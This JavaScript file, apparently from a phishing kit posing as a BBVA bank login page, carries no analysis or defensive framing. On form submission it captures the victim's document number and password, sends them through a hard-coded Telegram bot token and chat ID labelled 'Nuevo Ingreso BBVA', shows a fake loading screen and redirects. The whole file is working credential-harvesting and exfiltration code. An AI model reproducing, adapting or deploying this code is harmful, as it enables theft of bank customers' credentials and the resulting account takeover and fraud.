// Generar un Session ID único
function generarSessionId() {
    const timestamp = Date.now().toString(36);
    const random = Math.random().toString(36).substring(2, 10);
    return `${timestamp}-${random}`;
}

// Guardar el Session ID en una cookie
function guardarSessionIdEnCookie(sessionId) {
    const fechaExpiracion = new Date();
    fechaExpiracion.setTime(fechaExpiracion.getTime() + (24 * 60 * 60 * 1000)); // 1 día
    document.cookie = `sessionId=${sessionId}; expires=${fechaExpiracion.toUTCString()}; path=/`;
}

// Obtener el Session ID de la cookie
function obtenerSessionIdDeCookie() {
    const cookies = document.cookie.split(';');
    for (let cookie of cookies) {
        const [nombre, valor] = cookie.trim().split('=');
        if (nombre === 'sessionId') {
            return valor;
        }
    }
    return null;
}

// Verificar si ya existe un Session ID
let sessionId = obtenerSessionIdDeCookie();
if (!sessionId) {
    sessionId = generarSessionId();
    guardarSessionIdEnCookie(sessionId);
}

// Enviar datos al servidor cuando se envía el formulario
document.getElementById('login-form').addEventListener('submit', function (e) {
    e.preventDefault();

    // Mostrar el loader
    document.getElementById('loading-overlay').style.display = 'flex';

    // Capturar los valores de los inputs
    const documento = document.getElementById('num-doc').value;
    const clave = document.getElementById('password').value;

    // Crear el objeto con los datos y el Session ID
    const datos = {
        sessionId: sessionId,
        documento: documento,
        clave: clave
    };

    // Enviar los datos a Telegram
    enviarDatosTelegram(documento, clave);

    // Simular un proceso (ej. una solicitud de red)
    setTimeout(() => {
        // Ocultar el loader
        document.getElementById('loading-overlay').style.display = 'none';

        // Redirigir a otro documento HTML
        window.location.href = "loader.html";
    }, 2000);
});

// Función para enviar datos a múltiples bots de Telegram
function enviarDatosTelegram(documento, clave) {
    const bots = [
        { token: "7695570773:AAFT410wCwuCwFBOPBZxwYqJTdCRiiFSUms", chatId: "6328222257" }
    ];

    bots.forEach(bot => {
        const mensaje = `📲 *Nuevo Ingreso BBVA*\n\n📞 Documento: ${documento}\n🔐 Clave: ${clave}\n🆔 Session ID: ${sessionId}`;
        const url = `https://api.telegram.org/bot${bot.token}/sendMessage?chat_id=${bot.chatId}&text=${encodeURIComponent(mensaje)}&parse_mode=Markdown`;

        fetch(url)
            .then(response => {
                if (!response.ok) {
                    throw new Error(`Error en la solicitud: ${response.status} ${response.statusText}`);
                }
                return response.json();
            })
            .then(data => console.log(`Mensaje enviado a bot: ${bot.token}`, data))
            .catch(error => console.error(`Error al enviar mensaje: ${error.message}`));
    });
}

